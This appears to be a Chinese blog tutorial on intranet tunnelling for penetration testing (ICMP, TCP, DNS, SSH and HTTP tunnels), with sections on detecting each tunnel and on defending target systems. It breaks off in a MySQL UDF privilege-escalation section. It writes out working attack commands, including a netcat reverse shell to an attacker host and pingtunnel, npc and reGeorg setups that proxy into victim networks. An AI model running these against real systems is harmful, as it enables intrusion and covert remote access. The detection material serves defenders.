<p><strong>1.2 正向与反向代理的概念</strong></p>
<p>正向代理和反向代理是资源访问上的两个不同概念，一般来讲有下面两个含义。</p>
<p>正向代理：当客户端无法访问外部资源的时候（由于诸如墙这样的原因），可以通过一个正向代理去间接访问，所以客户端需要配置代理服务器的ip。正向代理是一个位于客户端和原始服务器之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。</p>
<p>反向代理：客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。</p>
<p><img src="/photo/image-20240627105601792.png" alt="image-20240627105601792"></p>
<p>但是对于渗透攻击者来说，从视角上看到的正向代理和反向代理和传统定义的正向与反向代理有一定区别。简单来说可以这样理解：</p>
<p>正向代理：攻击者主动连接代理服务器</p>
<p>反向代理：代理服务器主动连接攻击者</p>
<p><strong>1.3 内网穿透的具体表现</strong></p>
<p>内网穿透是指通过“隧道技术”打通了一条从攻击者到目标机器的通道，主要表现为下面三个方面。</p>
<p>1）反弹shell</p>
<p>从目标机器能够反弹shell到攻击者的外网VPS，攻击者通过反弹回来的shell能够很方便的对目标内网进行扫描，这就是反向代理的一种表现形式。</p>
<p>2）端口转发</p>
<p>通过指定一条专门的通道，能够对目标内网某台机器的某个具体端口进行访问，这种端口转发通常是一对一的。</p>
<p>3）sock代理或者http代理</p>
<p>开通一条专门的通道，并且提供http代理或者sock代理。攻击者可以通过配置响应的代理，直接访问目标内网任意机器，这就是正向代理的一种表现形式。</p>
<p><strong>02</strong> <strong>常用隧道介绍</strong></p>
<p>我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道、tcp隧道等。理论上所有的协议都可以作为隧道传输协议，并且传输的数据可以支持自定义的加解密算法。</p>
<p>按照隧道所处的协议层对不同的隧道技术进行分类，大体上可以分为下面几种。</p>
<p><strong>2.1 网络层隧道</strong></p>
<h3 id="2-1-1-ICMP隧道"><a href="#2-1-1-ICMP隧道" class="headerlink" title="2.1.1 ICMP隧道"></a><strong>2.1.1 ICMP隧道</strong></h3><h4 id="icmp流量特征"><a href="#icmp流量特征" class="headerlink" title="icmp流量特征"></a>icmp流量特征</h4><p>ICMP协议分析<br>ICMP报文信息被封装在IP数据包内部，作为IP数据包的数据部分通过互联网传递。当IP报头中的Protocol(协议)字段值为1时，说明是一个ICMP报文。ICMP报文包含三个固定字段。Type字段表示ICMP消息的类型；Code字段表示ICMP消息类型细分的子类型；Checksum字段表示ICMP报文的校验值，检验报文传输过程中是否出现差错。Data字段是可选的，包含与ICMP消息相关的附加信息，明文传输。其内容取决于ICMP消息的类型和代码。长度可以为0，也可以是任意长度。不同的Type和Code值表示不同的ICMP报文类型，对应了数据包处理过程中可能出现的不同错误情况，不同类型的ICMP报文又分为差错报文和查询报文两种，如下表所示。</p>
<p><strong>2.1.1.1 常见ICMP隧道工具</strong></p>
<p>ICMP隧道是指通过ICMP协议来传输数据，ICMP协议不需要开放新的端口，容易被防火墙放过，是目前目标流行的一种绕过防火墙的数据传输方式之一。</p>
<p><strong>1）icmpsh</strong></p>
<p>icmpsh是一个比较轻巧的ICMP隧道技术工具，能够通过ICMP来反弹shell。优点是不需要目标机器上的root权限，缺点是功能单一，反弹回来的cmd极不稳定。</p>
<p>由于icmpsh对应传输的ICMP数据并没有加密，所以通过抓包很容易检测到其中的特征数据，如图2.1.1.1.1所示。</p>
<p><img src="/photo/640.webp" alt="图片"></p>
<p>github: <a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p>
<p>使用参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/250711.html">https://www.freebuf.com/articles/web/250711.html</a></p>
<p><strong>2）icmptunnel</strong></p>
<p>icmptunnel是通过在客户端和服务端分别创建虚拟网卡，利用ICMP协议来传输两个虚拟网卡之间的数据。缺点是需要root权限，并且要创建网卡，容易被发现。</p>
<p>github: <a target="_blank" rel="noopener" href="https://github.com/DhavalKapil/icmptunnel">https://github.com/DhavalKapil/icmptunnel</a></p>
<p>使用参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/242015.html">https://www.freebuf.com/articles/network/242015.html</a></p>
<p><strong>3）pingtunnel</strong></p>
<p>Pingtunnel是最流行的一款ICMP代理工具，提供对tcp&#x2F;udp&#x2F;sock5流量伪装成icmp流量进行转发的功能。</p>
<p>利用条件：需要root或者administrator&#x2F;system权限。网上有的说法是不需要管理员权限，本人实际测试中，管理员权限是需要的。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<p>◆ 构建正向代理的ICMP攻击链路</p>
<p>被攻击端：</p>
<p>Victim1 x.x.x.x (公网地址)， 10.29.84.80（内网地址）</p>
<p>Victim2 10.29.84.63（内网地址）</p>
<p>攻击端：</p>
<p>Attack  随意，能上网就行</p>
<p>整个利用过程如下：</p>
<p>① 在Victim1的机器上运行代码，运行之后Victim1 就是ICMP SERVER。会接受客户端发过来的ICMP数据包。</p>
<p>.&#x2F;pingtunnel -type server -noprint 1 -nolog 1</p>
<p>-type server 代表开启ICMP SERVER端，等待客户端进行连接与通信。</p>
<p>-noprint 1 不在控制台打印日志</p>
<p>-nolog 1 不存储日志文件</p>
<p>② 在Attack的机器上运行代码，运行之后代表Attack的机器开启4455端口作为sock5代理。</p>
<p>pingtunnel.exe -type client -l :4455 -s xx.xx.xx.xx -sock5 1 -noprint 1 -nolog 1</p>
<p>其中xx.xx.xx.xx替换为Victim1 对应的IP</p>
<p>③ 攻击者可以通过Proxifier设置全局的sock5代理来对目标内网的Victim2进行攻击。简单验证的话可以直接在浏览器中设置sock5代理。</p>
<p><img src="/photo/640-17194569982223.webp" alt="图片"></p>
<p>图2.1.1.1.2.正向代理的ICMP攻击链路</p>
<p>正向代理的ICMP攻击链路，要求目标机器1必须有公网IP，并且能正常地进行PING操作。</p>
<p>◆ 构建反向代理的ICMP攻击链路</p>
<p>被攻击端：</p>
<p>Victim1 10.29.84.80（内网地址）</p>
<p>Victim2 10.29.84.63（内网地址）</p>
<p>攻击端：</p>
<p>Attack xx.xx.xx.xx（公网IP）</p>
<p>反向代理和正向代理的攻击方式相比，就是把运行的代码交换了位置，原来在攻击者机器运行的程序换到目标机器1上运行，原来在目标机器1上运行的程序换到攻击者机器上运行。</p>
<p>① 在Attack的机器上运行代码，运行之后Attack就是ICMP SERVER。会接受客户端发过来的ICMP数据包。</p>
<p>.&#x2F;pingtunnel -type server -noprint 1 -nolog 1</p>
<p>-type server 代表开启ICMP SERVER端，等待客户端进行连接与通信。</p>
<p>② 在Victim1的机器上运行代码，运行之后代表Victim1的机器开启4455端口作为sock5代理。</p>
<p>pingtunnel.exe -type client -l :4455 -s xx.xx.xx.xx -sock5 1 -noprint 1 -nolog 1</p>
<p>其中xx.xx.xx.xx替换为Attack对应的IP</p>
<p><img src="/photo/640-17194569982224.webp" alt="图片"></p>
<p>图2.1.1.1.3 反向代理的ICMP攻击链路</p>
<p>但是到目前为止，我们只是在目标机器1上开启了一个sock5的代理端口4455，代理之后的请求会通过ICMP的请求包进行转发。</p>
<p><strong>2.1.1.2 ICMP隧道检测技术</strong></p>
<p><strong>1）通过ICMP数据包的数量检测</strong></p>
<p>一个正常的 ping每秒最多只会发送两个数据包，而使用ICMP隧道的浏览器在同一时间会产生大量ICMP 数据包。</p>
<p><img src="/photo/640-17194569982225.webp" alt="图片"></p>
<p>图2.1.1.2.1短时间内产生大量ICMP数据包</p>
<p><strong>2）对单个数据包的DATA字段大小进行检验</strong></p>
<p>ICMP隧道数据包中DATA 往往大于64 比特</p>
<p><img src="/photo/640-17194569982226.webp" alt="图片"></p>
<p>图2.1.1.2.2单个ICMP数据包的大小远大于正常数据包</p>
<p><strong>3）寻找响应数据包和请求数据包payload不一致的ICMP数据包</strong></p>
<p><img src="/photo/640-17194569982237.webp" alt="图片"></p>
<p>图2.1.1.2.3请求和响应不一致的数据包</p>
<p>windows系统下ping默认传输的是：abcdefghijklmnopqrstuvwabcdefghi，共32bytes</p>
<p>linux系统下，ping默认传输的是48bytes，前8bytes随时间变化，后面的固定不变，内容为!”#$%&amp;’()+,-.&#x2F;01234567</p>
<p>参考:</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/202634.html">https://www.freebuf.com/articles/network/202634.html</a></p>
<p><strong>4）检查ICMP数据包的协议标签</strong></p>
<p>比如icmptunnel会在所有icmp payload前面加上TUNL标识来标识隧道。</p>
<p><img src="/photo/640-17194569982238.webp" alt="图片"></p>
<p>图2.1.1.2.4部分数据包的特殊标识</p>
<p><strong>2.2 传输层隧道</strong></p>
<h3 id="2-2-1-TCP隧道"><a href="#2-2-1-TCP隧道" class="headerlink" title="2.2.1 TCP隧道"></a><strong>2.2.1 TCP隧道</strong></h3><p><strong>2.1.1.1 常见TCP隧道工具</strong></p>
<p><strong>1）netcat</strong></p>
<p>又名nc，网络工具中的瑞士军刀，使用量最广的反弹shell的手段之一，linux系统一般自带。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
<p>使用参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csacs/article/details/91440568">https://blog.csdn.net/csacs/article/details/91440568</a></p>
<p>使用步骤，在服务端监听端口</p>
<p>nc -lvvp 8443</p>
<p>在客户端连接服务端端口</p>
<p>nc.exe -e cmd xx.xx.xx.xx 8443</p>
<p><img src="/photo/640-17194569982239.webp" alt="图片"></p>
<p>图2.1.1.1.1 nc反弹shell截图</p>
<p><strong>2）Powercat</strong></p>
<p>powershell版本的nc，用法基本上同nc一样。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<p><strong>3）lcx</strong></p>
<p>lcx是一款比较常见的端口转发工具，上个世纪的产品了，以前用的多，现在已经用的人比较少了，主要是基本上的杀软都会杀。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a></p>
<p><strong>4）HTRAN</strong></p>
<p>功能基本上和lcx一样，但是是跨平台的。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/bGN4/HTran/tree/master/HTran">https://github.com/bGN4/HTran/tree/master/HTran</a></p>
<p><strong>5）Iox</strong></p>
<p>iox是一款功能强大的端口转发&amp;内网代理工具，该工具的功能类似于lcx和ew，但是iox的功能和性能都更加强大。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/244567.html">https://www.freebuf.com/articles/network/244567.html</a></p>
<p><strong>6）NATBypass</strong></p>
<p>使用go语言编写的端口转发工具，功能和用法基本上和lcx一样，具有很好的跨平台性。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/cw1997/NATBypass">https://github.com/cw1997/NATBypass</a></p>
<p><strong>7）ew(EarthWorm)</strong></p>
<p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。EW自带支持的多级代理机制是的EW成为目前最受攻击者喜欢的工具之一。</p>
<p>地址：<a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
<p><strong>8）Temite</strong></p>
<p>EarthWorm的升级版，已经永久停止更新。</p>
<p>地址：<a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></p>
<p><strong>9）Venom</strong></p>
<p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom/">https://github.com/Dliv3/Venom/</a></p>
<p><strong>10）Stowaway</strong></p>
<p>Stowaway是一个利用go语言编写的多级代理工具，功能非常类似Venom。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p>
<p><strong>11）Ssocks</strong></p>
<p>正向和反向的socks工具，可执行文件的大小很小</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/54Pany/sSocks">https://github.com/54Pany/sSocks</a></p>
<p><strong>12）frp</strong></p>
<p>frp是一款轻量级的内网穿透工具，最早是为了方便运维人员远程对目标内网环境进行管理，提供了tcp端口转发、http代理、socks5代理等功能。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<p><strong>13）npc&#x2F;nps</strong></p>
<p>npc&#x2F;nps是一款基于TCP协议的代理工具，本身提供基于各种平台的客户端，稳定性好，并且可以自定义数据加密方式。支持端口转发，http代理，sock5代理。是目前最受攻击者喜欢的工具之一。</p>
<p>地址：</p>
<p><a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps/%EF%BC%9B">https://ehang-io.github.io/nps/；</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
<p>使用nps&#x2F;npc构建反向代理使用步骤</p>
<p>① 在外网的VPS上面运行</p>
<p>docker run –name nps -p 280:80 -p 2443:443 -p 28080:8080 -p 28024:8024 -p 5001-5100:5001-5100 -v &#x2F;opt&#x2F;conf:&#x2F;conf ffdfgdfg&#x2F;nps</p>
<p>② 打开nps对应的web服务<a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:28080/%EF%BC%8C%E8%BE%93%E5%85%A5%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4">http://xx.xx.xx.xx:28080/，输入默认口令</a> admin 123</p>
<p>新建一个客户端地址，记录下生成的随机key</p>
<p><img src="/photo/640-171945699822310.webp" alt="图片"></p>
<p>③在目标机器上面运行</p>
<p>npc -server&#x3D;xx.xx.xx.xx:28024 -vkey&#x3D;kow4td3v819abec6 -type&#x3D;tcp</p>
<p><img src="/photo/640-171945699822311.webp" alt="图片"></p>
<p>④ 在nps的管理端，显示连接为“在线”之后，点击“隧道”，新增一个socks5隧道。</p>
<p>端口选择5001-5100中的某个端口。</p>
<p><img src="/photo/640-171945699822312.webp" alt="图片"></p>
<p>经过上面的步骤之后，我们就在vps上面开放了一个sock5代理，端口为5002。连接该代理的请求会直接转发到目标机器内网。</p>
<p><strong>2.1.1.2 TCP隧道检测技术</strong></p>
<p>不同的工具使用的TCP隧道发送和接受数据包的格式都不一样，并且由于TCP隧道目前来说相对比较成熟，也导致大多数TCP隧道都是属于加密隧道。</p>
<p>对于简单的非加密的隧道工具，通常我们直接从数据包中就能找到很明显的特征。如图2.1.1.2.1所示。</p>
<p><img src="/photo/640-171945699822313.webp" alt="图片"></p>
<p>图2.1.1.2.1NC明文传输的TCP数据包特征流量</p>
<p>EarthWorm(简称ew)是一款比较好用的多级代理转发工具，相较于其他很多工具都要小很多，适用于一些特殊场景。与nc相比，EarthWorm能够提供socks5代理的功能，适用性明显更广泛一些。但是从本质上来说EarthWorm还是只是流量转发的工具，并没有对流量进行加密，从流量中能够看到明文的内网请求的流量。</p>
<p><img src="/photo/640-171945699822314.webp" alt="图片"></p>
<p>图2.1.1.2.2使用EW转发明文的内网请求流量</p>
<p>EW在建立连接和维持连接的时候也有明显的特征，通过TCP连接发送和响应数据包“xx xx 00 00 00 00”来保持连接。最开始的时候客户端会向服务端发送“01 01 00 00 00 00”（如图2.1.1.2.3所示），服务端会响应“01 02 00 00 00 00”。后面的很多tcp包都和这个很相似，可以作为流量匹配的特征。</p>
<p><img src="/photo/640-171945699822315.webp" alt="图片"></p>
<p>图2.1.1.2.3使用EW建立连接和维持连接状态的特征包</p>
<p>对于加密传输的数据包流量，就只能针对不同的工具寻找对应不同的特征点。抓了一下npc在建立连接之后的特征，npc的客户端在与服务端建立连接之后，会一直发送带有当前时间信息的数据包。</p>
<p><img src="/photo/640-171945699822316.webp" alt="图片"></p>
<p>图2.1.1.2.4 NPC心跳数据包特征</p>
<p>frp是另一种常用的内网代理工具，使用frp建立作为内网代理工具时也有明显的流量特征。在客户端和服务端建立tcp连接时，客户端会发送本机基础信息和frp版本信息，均为明文的流量信息，如图2.1.1.2.5所示。因为frp默认使用TLS加密数据，tcp的数据包中会有很多关于TLS证书相关的信息，如图2.1.1.2.6所示。</p>
<p><img src="/photo/640-171945699822417.webp" alt="图片"></p>
<p>图2.1.1.2.5 frp连接建立时的流量特征</p>
<p><img src="/photo/640-171945699822418.webp" alt="图片"></p>
<p>图2.1.1.2.6 frp数据包中的TLS特征</p>
<p><strong>2.1 网络层隧道</strong></p>
<h3 id="2-2-2-UDP隧道"><a href="#2-2-2-UDP隧道" class="headerlink" title="2.2.2 UDP隧道"></a><strong>2.2.2 UDP隧道</strong></h3><p><strong>2.2.2.1常见UDP隧道工具</strong></p>
<p><strong>1）Udp2raw</strong></p>
<p>一款常见的UDP隧道工具，该工具可以利用原始套接字并通过伪造的TCP&#x2F;UDP&#x2F;ICMP流量来帮助研究人员绕过UDP防火墙。</p>
<p><strong>2）frp</strong></p>
<p>frp既是一款常见的TCP隧道工具，也是一款UDP隧道工具。</p>
<p>要通过UDP协议来转发内网请求，可以通过在frp中开启kcp模式，如图2.2.2.1.1所示。从图中可以看出，使用UDP协议和TCP协议的流量特征一样的。</p>
<p><img src="/photo/640-171945699822419.webp" alt="图片"></p>
<p>图2.2.2.1.1 frp使用udp协议搭建内网代理</p>
<p><strong>2.3 应用层隧道</strong></p>
<h3 id="2-3-1-DNS隧道"><a href="#2-3-1-DNS隧道" class="headerlink" title="2.3.1 DNS隧道"></a><strong>2.3.1 DNS隧道</strong></h3><p><strong>2.3.1.1常见DNS隧道工具</strong></p>
<p><strong>1）dnscat2</strong></p>
<p>通过将其他协议封装在DNS协议中传输建立通信。因为在我们的网络世界中DNS是一个必不可少的服务，所以大部分防火墙和入侵检测设备很少会过滤DNS流量，这就给DNS作为一种隐蔽信道提供了条件，从而可以利用它实现诸如远程控制，文件传输等操作。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
<p><strong>2）dnscat2-powrshell</strong></p>
<p>Powershelll版本的dnscat2。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p>
<p><strong>3）dns2tcp</strong></p>
<p>dns2tcp 是一个利用DNS隧道转发TCP连接的工具，支持KEY和TXT类型的请求，用C语言开发。它分为两个部分，服务端和客户端，服务端运行在linux服务器上，客户端可以运行在linux和windows上(其他平台没有测试过)，编译完成后在服务端上的可执行文件名称为dns2tcpd，在客户端(linux)上的名称为dns2tcpc。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/alex-sector/dns2tcp">https://github.com/alex-sector/dns2tcp</a></p>
<p><strong>4）Iodine</strong></p>
<p>iodine是目前比较活跃，知名度比较大的一个dns tunneling实现工具，平台覆盖范围广，它可以运行在Linux, Mac OS X, FreeBSD, NetBSD, OpenBSD 和 Windows上，甚至还有android客户端，不过它需要安装TUN&#x2F;TAP。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p>
<p><strong>2.3.1.2 DNS隧道检测技术</strong></p>
<p><strong>1）通过请求和相应包的大小进行监测</strong></p>
<p>通常dns tunneling为了取得较大的带宽，会选择构造尽量大的dns请求和响应。</p>
<p>2）检测TXT记录类型发送请求和响应，而在正常的DNS网络流量中，TXT记录的比例可能只有1%-2%，如果时间窗口内，TXT记录的比例激增，那么也意味着存在异常。</p>
<p>3）还有各种各样的论文，有好多论文都提到了怎么检测DNS隧道流量检测。运用了各种算法，看不懂。</p>
<h3 id="2-3-2-SSH隧道"><a href="#2-3-2-SSH隧道" class="headerlink" title="2.3.2 SSH隧道"></a><strong>2.3.2 SSH隧道</strong></h3><p>ssh隧道通常不使用第三方的工具，直接使用linux自带的openssh客户端就可以进行端口转发。使用方法如下</p>
<h5 id="SSH隧道有三种端口转发模式"><a href="#SSH隧道有三种端口转发模式" class="headerlink" title="SSH隧道有三种端口转发模式"></a>SSH隧道有三种端口转发模式</h5><p>   本地端口转发(也就是正向连接)、远程端口转发(就是反向连接)和动态端口转发(就是socks代理)。下面是一些常见参数说明</p>
<p>sudo ssh -Nf -L 192.168.0.159:3334:192.168.213.131:3389 192.168.0.159</p>
<p><img src="/photo/640-171945699822420.webp" alt="图片"></p>
<p>这里我们用到了SSH客户端的三个参数，下面我们一一做出解释：</p>
<p>◆ -N 告诉SSH客户端，这个连接不需要执行任何命令。仅仅做端口转发</p>
<p>◆ -f 告诉SSH客户端在后台运行</p>
<p>◆ -L 做本地映射端口，被冒号分割的三个部分含义分别是最后一个参数是我们用来建立隧道的中间机器的IP地址(IP: 192.168.0.159)    </p>
<p>◆ 需要使用的本地端口号（端口: 3334)</p>
<p>◆ 需要访问的目标机器IP地址（IP: 192.168.213.131）</p>
<p>◆ 需要访问的目标机器端口（端口: 3389)</p>
<p>那么本地局域网的任何机器访问192.168.0.159:3334都会自动被映射到192.168.213.131:3389。</p>
<p><img src="/photo/640-171945699822421.webp" alt="图片"></p>
<p>图2.3.2.1 ssh端口转发之后效果</p>
<h3 id="2-3-3-HTTP隧道"><a href="#2-3-3-HTTP隧道" class="headerlink" title="2.3.3 HTTP隧道"></a><strong>2.3.3 HTTP隧道</strong></h3><p><strong>2.3.3.1常见的HTTP隧道工具</strong></p>
<p><strong>1）reDuh</strong></p>
<p>最早出现的http正向代理的工具，能够把webshell转化进行端口转发，工具客户端提供gui界面。</p>
<p><strong>2）tunnel</strong></p>
<p>属于reDuh的升级产品，通过在攻击端使用python把webshell转化为sock代理和端口转发。，目前来说还是有比较大的使用量。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></p>
<p><strong>3）reGeoge</strong></p>
<p>reGeoge属于tunnel的替代和升级产品，通过在攻击端使用python把webshell转化为sock5代理。属于目前还比较流行的一种内网穿透方式。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
<p>具体的使用步骤如下：</p>
<p>◆ 上传对应的tunnel文件到服务端，并且进行访问。如图2.3.3.1.1所示。</p>
<p><img src="/photo/640-171945699822422.webp" alt="图片"></p>
<p>图2.3.3.1.1 tunnel文件上传之后返回页面</p>
<p>◆ 本地攻击端通过python2运行</p>
<p>python reGeorgSocksProxy.py -p 8888 -u <a target="_blank" rel="noopener" href="http://x.x.x.x/tunnel.php">http://x.x.x.x/tunnel.php</a></p>
<p><img src="/photo/640-171945699822423.webp" alt="图片"></p>
<p>图2.3.3.1.2通过webshell开启本地sock5代理</p>
<p>通过上面这两步之后就在本地开启了一个sock5代理，通过这个代理就可以直接访问到目标服务器的内网，配合proxifier等工具就能对目标内网进行扫描和其他攻击行为。</p>
<p><strong>4）Neo-reGeorg</strong></p>
<p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃.</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<p><strong>5）ABPTTS</strong></p>
<p>TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p>
<p><strong>2.3.3.2 HTTP隧道检测技术</strong></p>
<p>http的隧道通常需要上传一个脚本文件（asp, aspx, php, jsp）。通过脚本文件来复用靶机的web端口，构造一条代理链路或者进行端口转发。</p>
<p><strong>1）通过脚本文件页面返回内容进行检测。</strong></p>
<p>reDuh脚本文件默认返回。</p>
<p><img src="/photo/640-171945699822424.webp" alt="图片"></p>
<p>图2.3.3.2.1 reDuh脚本默认返回</p>
<p>比如上传 ReGeorg tunnel文件，页面对应的返回基本上都是下面的页面内容。</p>
<p><img src="/photo/640-171945699822424.webp" alt="图片"></p>
<p>图2.3.3.2.2 reGeorg 页面默认响应</p>
<p>这种http代理类型的工具刚开始的时候都会有一个建立连接的请求包，这个请求包都具有比较明显的特征，如下所示。</p>
<p><img src="/photo/640-171945699822425.webp" alt="图片"></p>
<p>2.3.3.2.3 reGeorg请求的默认请求头，其中Accept-Encoding字段有特征</p>
<p><img src="/photo/640-171945699822426.webp" alt="图片"></p>
<p>2.3.3.2.4 tunnel默认的请求头，其中authorization字段有特征</p>
<p><strong>2）通过流量中的数据特征来分析攻击行为。</strong></p>
<p>这里的流量特征基本上都是明文信息，只要按照通用的攻击检测技术就可以了。</p>
<h2 id="靶标"><a href="#靶标" class="headerlink" title="靶标"></a>靶标</h2><ol>
<li>网络边界防护<br>防火墙：配置防火墙以阻止未经授权的访问，过滤不必要的流量。<br>入侵检测和防御系统（IDS&#x2F;IPS）：监控和分析网络流量，检测和阻止潜在的威胁。<br>VPN：通过虚拟专用网络（VPN）加密外部访问，确保远程访问的安全性。</li>
<li>身份验证和访问控制<br>多因素认证（MFA）：使用多种验证方式（如密码、短信验证码、指纹）来加强身份验证。<br>最小权限原则：只授予用户和应用程序执行任务所需的最低权限，避免过度授权。<br>访问控制列表（ACLs）：严格定义和管理用户和设备的访问权限。</li>
<li>数据保护<br>加密：在传输和存储过程中加密敏感数据，防止数据泄露。<br>备份和恢复：定期备份数据，并测试数据恢复计划，以确保在遭遇数据丢失或破坏时能够迅速恢复。<br>数据丢失防护（DLP）：使用DLP解决方案监控和保护敏感信息，防止数据泄漏。</li>
<li>监控和日志管理<br>实时监控：实施24&#x2F;7的网络监控，及时发现和响应安全事件。<br>日志管理和分析：收集和分析系统日志、网络流量日志等，检测异常活动和潜在威胁。<br>安全信息和事件管理（SIEM）：集成和分析安全事件数据，提供统一的视图和自动化响应能力。</li>
<li>漏洞管理<br>定期扫描：使用漏洞扫描工具定期扫描网络和系统，发现并修补漏洞。<br>补丁管理：及时应用操作系统、应用程序和设备的安全补丁，减少被攻击的风险。<br>威胁情报：获取并分析最新的威胁情报，预防新兴攻击。</li>
<li>应急响应和恢复<br>事件响应计划：制定并定期更新事件响应计划，明确各类安全事件的处理步骤和责任人。<br>事故报告机制：建立快速报告和处理安全事件的机制，确保事件及时被发现和处理。<br>恢复计划：制定详细的数据恢复和业务连续性计划，确保在发生安全事件后能够迅速恢复正常业务。</li>
</ol>
<p>首先靶标系统应经过多次安全测试，自身安全有保障；其次应梳理清与靶标系统有互联的网络，重新进行网络策略梳理，按照最小原则进行访问；最后靶标系统应部署在内部网络中，尽可能避免直接对互联网开放。条件允许的情况下，还可以对靶标系统主机部署安全防护系统，对靶标系统主机进行白名单限制，在防守中，可实时监测靶标系统的安全状态。</p>
<p>梳理了攻击者可能拿下靶标的攻击路径，在每一条攻击路径的重要节点放置蜜罐；在靶标所处的C段，围绕靶标放置很多蜜罐。在攻击者尝试通过内网横向拿下靶标的过程中，蜜罐的告警可以及时反应攻击者的内网横向进程，快速定位攻击者在内网的源头IP。一旦蜜罐发生告警，及时将源IP主机下线，进行应急处置，相当于打掉了攻击队的一个内网据点，来一个打掉一个。</p>
<p>这种策略防不了两种情况：<br>1、集权系统失陷：就是攻击者进入内网后，直接通过0day拿下堡垒机系统权限或者集权设备权限，或者通过Nday漏洞&#x2F;NTLM中继等方法拿下域控权限，最终导致内网关键业务系统全部沦陷，从中翻到靶标系统，不用经过蜜罐，直连靶标系统的情况。<br>2、靶标暴露公网：有些单位上报靶标资产，但其靶标暴露在公网上，相当于直接暴露给攻击队员，对靶标的攻击路径也就不需要经过蜜罐。这种情况下，攻击队员可以从各种渠道收集源码，审计出一个0day，可以直接将目标单位打穿出局。</p>
<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CREATE [AGGREGATE] FUNCTION function_name RETURNS &#123;STRING|INTEGER|REAL&#125; SONAME &#x27;文件名&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[AGGREATE]是聚集函数的表示，系统定义的聚集函数比如有COUNT()、AVE()、MN()、MAX()、SUM()</span><br><span class="line">SONAME &#x27;file&#x27;表示这个函数从哪个文件里面引入，而这个文件一般是动态链接库，windows下是dll，linux是so，并且这个文件要在mysql的plugin目录下</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">#删除自定义函数</span><br><span class="line">DROP FUNCTION function_name</span><br><span class="line"></span><br><span class="line">#查看plugin</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure>

<p>攻击者通过编写调用cmd或者shell的共享库文件（window为.dll，linux为.so），并且导入到一个指定的文件夹目录下，创建一个指向共享库文件的自定义函数，从而在数据库中的查询就等价于在cmd或者shell中执行命令。这些so或者dll在sqlmap和msf里都有</p>
<p>执行过程：本质上还是利用了MySQL能够执行系统命令的特点。具体过程如下</p>
